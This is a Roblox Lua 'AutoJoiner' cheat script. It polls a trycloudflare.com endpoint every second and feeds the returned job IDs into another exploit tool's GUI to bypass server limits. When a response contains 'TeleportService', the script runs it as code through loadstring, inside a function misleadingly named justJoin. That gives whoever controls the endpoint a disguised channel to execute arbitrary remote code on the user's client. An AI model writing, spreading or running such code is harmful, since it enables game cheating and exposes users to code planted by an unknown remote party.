

(function()
    repeat task.wait() until game:IsLoaded()
    local HttpService = game:GetService("HttpService")
    local EndpointURL =  "https://eur-remaining-ol-lopez.trycloudflare.com/"

    local function prints(str)
        print("[AutoJoiner]: " .. str)
    end

    -- UT: safe HTTP fetch
    local function UT()
        local response
        local success, err = pcall(function()
            response = HttpService:RequestAsync({
                Url = EndpointURL,
                Method = "GET",
                Headers = {["Content-Type"] = "application/json"}
            })
        end)
        if success and response and response.Body and #response.Body > 0 then
            return response.Body
        else
            prints("HTTP request failed or returned nil, retrying...")
            return nil
        end
    end

    local function findTargetGui()
        for _, gui in ipairs(game:GetService("CoreGui"):GetChildren()) do
            if not gui:IsA("ScreenGui") then continue end
            for _, descendant in ipairs(gui:GetDescendants()) do
                if descendant:IsA("TextLabel") and descendant.Text == "Job-ID Input" then
                    return descendant:FindFirstAncestorOfClass("ScreenGui")
                end
            end
        end
    end

    local function setJobIDText(targetGui, text)
        for _, btn in ipairs(targetGui:GetDescendants()) do
            if btn:IsA("TextButton") then
                local frames = {}
                for _, child in ipairs(btn:GetChildren()) do
                    if child:IsA("Frame") then
                        table.insert(frames, child)
                    end
                end
                if #frames < 2 then continue end

                local foundLabel = false
                for _, descendant in ipairs(frames[1]:GetDescendants()) do
                    if descendant:IsA("TextLabel") and descendant.Text == "Job-ID Input" then
                        foundLabel = true
                        break
                    end
                end
                if not foundLabel then continue end

                for _, subFrame in ipairs(frames[2]:GetChildren()) do
                    if subFrame:IsA("Frame") then
                        for _, obj in ipairs(subFrame:GetDescendants()) do
                            if obj:IsA("TextBox") then
                                obj.Text = text
                                prints("Textbox updated: " .. text .. " (10m+ bypass)")
                                return obj
                            end
                        end
                    end
                end
            end
        end
        return nil
    end

    local function clickJoinButton(targetGui)
        local function findButton(base)
            for _, btn in ipairs(base:GetDescendants()) do
                if btn:IsA("TextButton") then
                    for _, content in ipairs(btn:GetDescendants()) do
                        if content:IsA("TextLabel") and content.Text == "Join Job-ID" then
                            return btn
                        end
                    end
                end
            end
        end

        local current = targetGui
        for _ = 1, 4 do
            local button = findButton(current)
            if button then return button end
            current = current.Parent
            if not current then break end
        end
        return nil
    end

    local function bypass10M(jobId)
        local targetGui = findTargetGui()
        if not targetGui then
            prints("Target GUI not found.")
            return
        end
        setJobIDText(targetGui, jobId)
        local button = clickJoinButton(targetGui)
        if not button then
            prints("Join button not found.")
            return
        end
        task.defer(function()
            task.wait(0.05)
            for _, conn in ipairs(getconnections(button.MouseButton1Click)) do
                conn:Fire()
                prints("Join server clicked (10m+ bypass)")
            end
        end)
    end

    local function justJoin(script)
        local func, err = loadstring(script)
        if func then
            local ok, result = pcall(func)
            if not ok then
                prints("Error while executing script: " .. result)
            end
        else
            prints("Unexpected error: " .. err)
        end
    end

    local function pollServer()
        while true do
            local msg = UT() -- use the robust UT function
            if msg and msg ~= "" then
                if not string.find(msg, "TeleportService") then
                    prints("Bypassing 10m server: " .. msg)
                    bypass10M(msg)
                else
                    prints("Running the script: " .. msg)
                    justJoin(msg)
                end
            else
                prints("Failed to fetch job ID, retrying...")
            end

            task.wait(1) -- check every second
        end
    end

    pollServer()
end)()
